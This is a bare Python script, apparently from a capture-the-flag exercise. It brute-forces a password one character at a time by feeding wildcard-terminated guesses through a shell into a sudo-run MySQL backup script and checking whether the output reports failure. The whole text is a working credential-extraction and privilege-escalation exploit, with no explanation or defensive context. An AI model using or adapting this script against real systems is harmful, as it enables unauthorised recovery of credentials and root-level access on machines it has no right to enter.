import subprocess
import string

s=string.printable
c = ''
def reco(jp):
    re = subprocess.run(f'echo {jp} | sudo /opt/scripts/mysql-backup.sh', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, text=True)
    if 'err' in re.stderr:
        exit(1)
    return re.stdout

while True:
    for i in s:
        x=c+i+'*'
        a=reco(x)
        if 'failed' not in a:
            c+=i
            print(c)
            break
